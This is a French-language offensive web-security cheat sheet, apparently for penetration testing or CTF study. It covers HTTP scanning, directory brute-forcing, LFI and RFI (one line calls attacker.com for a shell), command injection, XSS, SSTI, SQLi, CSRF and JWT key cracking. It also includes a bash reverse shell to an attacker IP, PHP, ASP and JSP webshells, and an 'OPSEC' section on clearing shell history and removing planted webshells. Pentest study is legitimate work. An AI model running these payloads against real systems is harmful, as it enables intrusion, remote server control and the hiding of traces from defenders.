# 🌐 HTTP / HTTPS – Cheatsheet Cybersécurité Avancée

Ce fichier regroupe les commandes essentielles pour scanner, énumérer, tester, exploiter et post-exploiter des services web.

## 🔍 1. Détection & Scan de services web

nmap -p 80,443 <IP>

> Scan rapide des ports HTTP et HTTPS

nmap -sV --script=http-enum <IP>

> Détection des ressources web communes via NSE

nmap -p 80 --script http-title,http-methods,http-headers <IP>

>Récupération du titre, méthodes autorisées, headers du serveur

whatweb http://<IP>

>Détection de technologies : CMS, frameworks, versions…

httpx -u <IP> -td -title -server -tech-detect

>Scan ultra rapide d’info web (titres, versions, technologies)

## 📁 2. Énumération de répertoires & fichiers

gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

>Bruteforce des chemins (dossiers/fichiers)

ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

>Alternative rapide pour brute-forcer répertoires/fichiers

dirsearch -u http://<IP>

>Scan automatique incluant extensions par défaut

ffuf -u http://<IP>/admin/FUZZ -w /usr/share/seclists/... -e .php,.bak,.old,.zip

>Fuzzing ciblé avec extensions sensibles

## 🧠 3. Interactions manuelles HTTP

curl -I http://<IP>

>Affiche uniquement les headers HTTP d'une ressource

curl -v http://<IP>

>Affiche la requête complète, headers + contenu

curl -X OPTIONS http://<IP> -v

>Liste les méthodes HTTP autorisées

curl -X PUT http://<IP>/test.txt --data "test"

>Test de la méthode PUT (souvent vulnérable)

curl -X POST -d "user=admin&pass=admin" http://<IP>/login

>Envoi d’un formulaire simple en POST

curl -u admin:admin http://<IP>/private

>Authentification HTTP Basic

## 🪓 4. Vulnérabilités HTTP classiques
### 🔐 Bruteforce

hydra -l admin -P rockyou.txt <IP> http-get /admin

>Bruteforce HTTP GET avec Hydra

wfuzz -w wordlist.txt -u http://<IP>/login?user=FUZZ&pass=FUZZ

>Bruteforce GET avec paramètres

### 📁 Directory Traversal / LFI

curl http://<IP>/?file=../../../../etc/passwd

>Lecture de fichier via traversal

curl http://<IP>/?page=http://attacker.com/shell.txt

>RFI si include non filtré

### 🐚 RCE via paramètres

curl -X POST -d "cmd=id" http://<IP>/ping

>Paramètre non filtré → exécution possible de commandes

curl -X POST -d "ip=127.0.0.1;whoami" http://<IP>/check

>Injection de commande via point-virgule

## 🐞 5. Fuzzing avancé

ffuf -u "http://<IP>/index.php?FUZZ=test" -w /usr/share/seclists/...

>Recherche de paramètres GET existants

ffuf -X POST -d "username=FUZZ&password=test" -u http://<IP>/login -w params.txt

>Fuzzing de champs POST

wfuzz -z file,values.txt -u "http://<IP>/page?id=FUZZ"

>Fuzz des valeurs d’un paramètre donné

## 🧪 6. Tests manuels : XSS / SSTI / SQLi / CSRF / IDOR
### 🧨 XSS
```
http://<IP>/search?q=<script>alert(1)</script>
```
>Test XSS basique
```
" ><img src=x onerror=alert(1)>
```
>Payload XSS qui fonctionne même sur échappement partiel

### 🔥 SSTI (Jinja2, Twig, Velocity)
```
{{7*7}}
```
>Test SSTI Jinja2 / Flask
```
${7*7}
```
>Test SSTI Velocity

### 🧬 SQL Injection
```
?id=1' OR '1'='1
```
>Test SQL basique
```
?id=1 UNION SELECT 1,2,3
```
>Test de colonnes via UNION
```
sqlmap -u "http://<IP>/page?id=1" --batch
```
>Automatisation de la détection SQLi

### 🛡 CSRF
```
<form action="http://<IP>/change" method="POST"> <input type="hidden" name="role" value="admin"> </form> > Formulaire CSRF 
```
> simple exploitant la session de la victime

### 🔑 IDOR

http://<IP>/invoice?id=123

Changer l’ID pour tester l’accès non autorisé

## 🧬 7. Webshells & Reverse Shells
### 🐚 Bash Reverse Shell

bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

Reverse shell Unix classique

### 🐘 PHP Webshell
<?php system($_GET['cmd']); ?>

Webshell très simple à uploader

### 🌐 ASP / JSP

<% eval request("cmd") %>

Webshell ASP

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

Webshell JSP

## 🔑 8. Cookies, JWT & Sessions

curl -b "session=abc123" http://<IP>

Envoyer un cookie avec curl

echo -n "admin:true" | base64

Génération d'un cookie encodé Base64

jwt_tool token.jwt -d

Décodage d’un JWT

jwt_tool token.jwt -C --wordlist rockyou.txt

Bruteforce de la clé secrète

corsy -u http://<IP>

Analyse automatique des failles CORS

## 🛠 9. Outils Web indispensables

gobuster, ffuf, dirsearch

Fuzzing de répertoires

nmap, whatweb, httpx

Scan et identification de technologies

Burp Suite, ZAP, Postman

Manipulation et exploitation HTTP avancée

jwt_tool, Corsy

Audits d’authentification

waybackurls, amass, subfinder

Reconnaissance étendue

## 🧹 10. Nettoyage (OPSEC)

history -c && history -w

Nettoyer historique bash

rm /var/www/html/shell.php

Supprimer les webshells déposés

unset HISTFILE

Désactiver l’historique pour la session

## 📚 11. Ressources utiles

PayloadsAllTheThings

Très large collection d’exemples d’exploits web

HackTricks (HTTP/HTTPS)

Encyclopédie des attaques web

SecLists

Wordlists et payloads indispensables

OWASP Testing Guide

Référentiel officiel pour l’audit web
